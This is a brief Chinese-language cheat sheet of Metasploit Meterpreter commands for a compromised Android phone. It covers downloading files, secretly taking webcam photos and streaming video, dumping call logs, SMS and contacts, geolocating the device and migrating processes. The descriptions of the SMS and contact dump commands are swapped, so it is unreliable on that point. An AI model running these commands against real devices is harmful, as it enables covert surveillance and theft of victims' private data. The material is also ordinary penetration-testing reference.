
```text


sessions   //查看连接状态

sessions 1  //与ID为1的Android设备连接

//连接后常用命令

直接help  或者 ？

help

常用的命令（以后用一条写一条）

 cd              目录切换，命令：cd /  切换到根目录  
search           搜索文件，命令：search \*.jpg  
download         下载文件，命令：download test.jpg  
webcam_list      查看摄像头列表，因为手机都是前置和后置摄像头了  
webcam_snap      拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1  
webcam_stream    开启摄像头视频监控，同上，命令：webcam\_stream -i 1  
安卓系统相关命令：  
check_root       查看当前安卓是否已经root
dump_calllog     下载通话记录  
dump_contacts    下载短信记录  
dump_sms         下载通讯录  
geolocate        利用谷歌地图定位（需要安装谷歌地图）

其他
sysinfo		 查看靶机系统信息
ps 		 获取靶机正在运行的进程
getpid 		 查看msfshell的进程号
migrate PID  	 迁移进程
run post/windows/gather/checkvm  查看目标机器是不是再虚拟机上
screengrab或者 screenshot 命令抓取截图
```

参考 
- --help
- [利用MSF进行后渗透攻击](https://www.jianshu.com/p/eb99b5b9b0c9)